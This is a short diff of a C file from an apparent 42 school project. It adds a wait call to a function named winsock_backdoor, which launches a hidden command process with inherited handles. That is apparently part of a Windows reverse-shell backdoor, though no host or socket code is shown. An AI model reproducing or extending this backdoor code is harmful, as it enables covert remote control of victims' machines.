@@ -6,7 +6,7 @@
 /*   By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/01/10 23:40:11 by joesanto          #+#    #+#             */
-/*   Updated: 2026/01/11 19:24:05 by joesanto         ###   ########.fr       */
+/*   Updated: 2026/01/11 21:43:35 by joesanto         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -40,6 +40,7 @@ void	winsock_backdoor(void)
 	si.wShowWindow = SW_HIDE;
 	if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
 		return ;
+	WaitForSingleObject(pi.hProcess, INFINITE);
 	CloseHandle(pi.hProcess);
 	CloseHandle(pi.hThread);
 }
